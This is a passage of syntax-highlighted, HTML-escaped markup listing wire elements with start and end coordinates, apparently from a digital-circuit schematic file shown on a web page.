&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(330,230)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(330,340)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(330,230)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(690,230)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(350,220)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(350,270)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(350,270)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(590,270)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,120)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,140)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,120)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(480,120)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,150)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,150)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,160)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,160)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,170)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,170)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,180)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,180)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,190)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,200)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,210)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(370,220)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,220)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,140)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,160)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,140)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(430,140)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,210)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,210)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,210)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,500)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,500)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,510)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,510)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,520)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,520)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,530)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,530)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,550)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,550)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,560)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(410,560)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,570)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(400,570)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(380,580)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,580)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,160)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,180)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,160)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,160)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,190)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,200)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,200)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(440,200)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,470)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,500)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;wire &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(390,470)&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;(420,470)&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&#x2F;&amp;gt;
